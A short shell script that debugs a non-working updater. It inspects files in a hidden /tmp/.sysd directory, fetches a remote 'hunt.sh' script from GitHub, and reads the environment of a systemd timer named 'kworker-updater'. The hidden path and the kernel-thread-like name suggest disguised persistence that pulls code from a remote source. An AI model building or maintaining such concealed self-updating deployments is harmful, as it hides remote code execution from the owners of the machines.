#!/bin/sh
# throwaway: why does box1's updater no-op?
W=/tmp/.sysd
echo "-- updater.sh lines: $(wc -l < $W/updater.sh)"
echo "-- CONFIG_URL in worker.env: $(grep -m1 '^CONFIG_URL=' $W/worker.env)"
echo "-- updater references worker.env: $(grep -c 'worker.env' $W/updater.sh)"
echo "-- CONFIG_URL mentions in updater:"
grep -n 'CONFIG_URL' $W/updater.sh | head -6
echo "-- file list line:"
grep -n 'for f in' $W/updater.sh
echo "-- direct fetch of published hunt.sh:"
if curl -fsSL -o /tmp/t.hs "https://raw.githubusercontent.com/ronnissleepy-code/scripts/main/hunt.sh" 2>/tmp/curl.err; then
    echo "curl OK bytes=$(wc -c < /tmp/t.hs) lines=$(wc -l < /tmp/t.hs)"
else
    echo "curl FAILED:"; cat /tmp/curl.err
fi
echo "-- updater runtime env:"
systemctl show kworker-updater.timer -p Environment
